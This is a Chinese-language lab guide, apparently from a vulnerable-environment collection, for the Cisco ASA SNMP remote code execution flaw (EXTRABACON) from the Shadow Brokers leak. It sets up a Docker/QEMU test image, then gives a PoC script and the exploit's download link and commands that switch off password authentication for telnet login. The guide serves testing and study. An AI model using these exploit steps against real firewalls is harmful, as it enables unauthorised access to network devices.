Cisco ASA SNMP 远程代码执行漏洞(方程式 EXBA)
---

### 漏洞信息

2016/08/16日左右自称「The Shadow Brokers」（影子经纪人）的黑客组织入侵了「EquationGroup」（方程式组织，外界透露该组织隶属于美国国家安全局NSA），获取到其内部数据，并将部分网络攻击工具与文件公布至互联网，甚至重金拍卖。从公开的部分数据分析，具有针对主流厂商防火墙产品的攻击工具与方法。

上述事件中提到的文件下载地址：https://github.com/samgranger/EQGRP

Cisco ASA 防火墙 8.x~8.4 版本 Simple Network Management Protocol 存在远程代码执行漏洞，黑客可在获取 community string 后执行任意代码。在开启 SSH 或 Telnet 情况下，可通过代码执行暂时关闭身份认证，从而以任意密码远程登录防火墙。

### 镜像信息

由于 cisco 启动需要自己的内核，而 docker 不能指定内核，所以在 docker 中安装了 qemu 模拟器，通过桥接方式将 cisco 与外网连通。

> 如果你有更好的办法，可以指出

类型 | 值
:-:|:-:|:-:
console 端口 | 2001
telnet 远程管理密码 | cisco
snmp community string | public

### 获取环境:

1. 拉取镜像到本地

 ```
$ docker pull medicean/vulapps:c_cisco_1
 ```

2. 启动环境

 ```
$ docker run --name=asaexba -d --privileged=true -p 2001:2001 medicean/vulapps:c_cisco_1
 ```
 > `-p 2001:2001` 前面的 2001 代表物理机的端口，可随意指定。
 >
 > 手动指定 Cisco ASA 内存(默认 1024M, 低于 512M 会启动不成功)： -e MEMORY=2048

3. 获取 ASA 的 IP 地址

 由于每个人的 Docker IP 地址段不统一，需要动态获取 ASA 的 IP 地址，Cisco IP 地址为容器 IP 主机位加 1。

 查看容器的 IP 地址：

 ```
 $ docker exec asaexba ifconfig
 ```
 例如查到的 IP 是: 172.17.0.2 那么 CISCO 的 IP 地址为 172.17.0.3

4. 检测是否启动

 路由器启动时间较长，根据个人机器和分配内存大小启动时长不一。在获取 ASA 的 IP 地址后，在物理机上使用 telnet 连接，如：
 ```
 $ telnet 172.17.0.3
 ```
 如果出现 cisco 远程管理界面则表示启动成功。


### 使用与利用

### PoC 使用

> 本例中使用 [Cisco SNMP 远程命令执行漏洞(方程式 EXBA) PoC](http://www.bugscan.net/source/plugin/4638/template/)


1. 下载并安装 `BugScan SDK`

 详见 [BugScan 插件开发文档 - 环境配置](http://doc.bugscan.net/chapter1/1-1.html)

2. 修改 `poc.py` 中地址为容器地址，修改 community string

 ```
if __name__ == '__main__':
    from dummy import *
    audit(assign(fingerprint.snmp, {"ip": '172.17.0.3', "community": "public"})[1])
 ```

3. 运行 `poc.py`

 ```
$ python poc.py
 ```

### Exp 使用

Exp 下载地址：https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/40258.zip

假设 Cisco ASA 的 IP 地址为: 172.17.0.3

1. 获取信息：
 ```
$ python extrabacon_1.1.0.1.py info -t 172.17.0.3 -c public
 ```
 执行成功后会在屏幕上显示 EXBA/keys 目录下生成的 .key 文件
 ```
To check the key file to see if it really contains what we're claiming:  
# cat /EXPLOITS/EXBA/keys/ac8d0q.key
 ```

2. 令远程管理密码失效:
 ```
$ extrabacon_1.1.0.1.py exec -k ac8d0q -t 172.17.0.3 -c public --mode pass-disable
 ```

3. 使用 telnet 登录
 ```
$ telnet 172.17.0.3
 ```
 输入任意密码即可登录成功(本环境中默认密码为 cisco)。

4. 令远程管理密码生效
 ```
$ extrabacon_1.1.0.1.py exec -k ac8d0q -t 172.17.0.3 -c public --mode pass-enable
 ```
